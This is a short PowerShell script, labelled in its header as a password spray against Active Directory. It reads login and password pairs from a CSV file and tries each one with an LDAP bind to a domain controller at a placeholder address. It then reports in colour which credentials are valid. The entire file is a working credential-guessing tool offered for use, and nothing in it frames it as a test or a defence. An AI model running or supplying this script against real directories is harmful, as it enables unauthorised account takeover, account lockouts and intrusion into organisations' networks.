###############################################################
#Password spray against AD, input from csv
#LDAP string can be written in 4 ways, 2 with IP and 2 with the name.
#Beware for the second and third way, WITHOUT the trailing "/", otherwise it wont work
#	"LDAP://10.14.3.0/DC=example,DC=lan"
#	"LDAP://10.14.3.0"
#	"LDAP://EXAMPLE-DC0.example.lan"
#	"LDAP://EXAMPLE-DC0.example.lan/DC=example,DC=lan"
###################

##################
#--------Function 
##################
Function Test-ADAuthentication {
    param($userlogin,$userpassword)
    (new-object directoryservices.directoryentry "LDAP://10.14.3.0/DC=example,DC=lan",$userlogin,$userpassword).psbase.name -ne $null
}
    
##################
#--------Main  
##################
cls
#Read credentials from the CSV file
Import-Csv .\input.csv -Delimiter ';' | Foreach-Object {
if (Test-ADAuthentication $_.login $_.password)
    {
        $message = "Valid credentials for " + $_.login + ""
        Write-Host $message -ForegroundColor Green 
    }
    else
    {
        $message = "Invalid credentials for " + $_.login + ""
        Write-Host $message -ForegroundColor Red 
    }
}
$wait = Read-Host